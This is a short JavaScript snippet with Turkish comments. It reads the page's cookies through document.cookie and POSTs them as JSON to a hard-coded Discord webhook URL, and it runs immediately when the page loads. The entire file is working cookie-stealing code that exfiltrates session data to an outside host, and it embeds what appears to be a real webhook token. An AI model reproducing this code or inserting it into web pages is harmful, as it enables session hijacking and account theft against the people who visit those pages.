// Cookie değerini ayarlayın
const cookieValue = "";

// Webhook URL'yi tanımlayın
const webhookUrl = "https://discord.com/api/webhooks/1144041635383099452/crG8a7-LfjpZNGROde-zgb8XScXSAk-gW_MiV7Fv5a12fnvckuA0TgOsXuoTPexUwWYn";

// Cookieleri webhooka göndermek için bir fonksiyon oluşturun
const sendCookiesToWebhook = () => {
  // İstek başlıklarını ayarlayın
  const headers = new Headers();
  headers.append("Content-Type", "application/json");

  // Cookieleri içeren payload nesnesini oluşturun
  const payload = {
    cookies: document.cookie
  };

  // HTTP POST isteği yapın
  fetch(webhookUrl, {
    method: "POST",
    headers: headers,
    body: JSON.stringify(payload)
  })
    .then(response => {
      if (response.ok) {
        console.log("Cookies successfully sent!");
      } else {
        console.error("Error sending cookies!");
      }
    })
    .catch(error => {
      console.error("An error occurred while sending cookies:", error);
    });
};

// Sayfa yüklendiğinde cookieleri göndermek için fonksiyonu çağırın
sendCookiesToWebhook();
